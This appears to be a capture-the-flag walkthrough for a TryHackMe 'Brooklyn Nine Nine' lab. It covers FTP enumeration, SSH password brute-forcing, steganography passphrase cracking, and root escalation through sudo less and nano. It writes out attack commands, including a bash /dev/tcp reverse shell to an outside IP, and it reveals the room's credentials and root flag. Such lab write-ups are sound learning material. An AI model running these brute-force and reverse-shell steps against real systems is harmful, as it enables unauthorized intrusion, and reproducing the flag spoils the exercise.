brooklyn999-thm
lets start with nmap scan

sudo nmap -A -T4 --min-rate=5000 -v -p- 10.10.197.255 -oN nmap.txt

so we found 3 ports open
port 21,22,80

anonymous login is allowed on ftp port 21, so let's start our enum from there

so we found 2 users from what we got in the ftp folder

amy
jake

we got a note which says jakes password is weak, lts try to brutforce into jake's ssh using ./ssb

./ssb -p 22 -w /path_to_wordlists jake@10.10.197.255
cool we got a pass for jake = 987654321

lets login to ssh
we are in

looking through we found another user and there folders

can't see to access amy= permission denied
but found our user flag in Holt's foldr

lets try to escalate our privilege to root

running sudo -l
we realize we can run less command as root
elevated our privilege by abusing this command using GTFOBINS and we got a root shell

cat /root/root.txt
63a9f0ea7bb98050796b649e85481845

thanks



2 ways to root the box 
lets find second way

we got 3 open ports from our initial scan, lets start with port 80

going through the page npthing interesting, found something about steg in the source code
lets see if we can download the image on the homepage and inspect it with steghide
it asks for a paraphase to check the embedded file

after some research, we found out we can bruteforce a steg file password using stegcracker or stegseek but stegseek is faster

now let's install both
stegcracker-- sudo apt install stegcracker
stegseek-- already installed in kali

after using stegseek to crack the image file
stegseek stegfile wordlists.txt
we got the paraphrase for the stegfile which is admin
and an output which contains ur Holt's password

cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!


now lets crack our stegfile
steghide extract -sf image.jpg
remeber our paraphase is admin if it ask again
we got an output written to note.txt
turns out it contains holt's pasword, the same details we got from stegseek output file

now lets ssh into holt

we already used method one to root the box so won't be going over it again but let's see how to escalate our privilege with holt

we can run nano as root

bash -c 'exec bash -i &>/dev/tcp/10.8.161.7/3322 <&1'

so we root the box with both methods, got a revrse shell back as root on our machine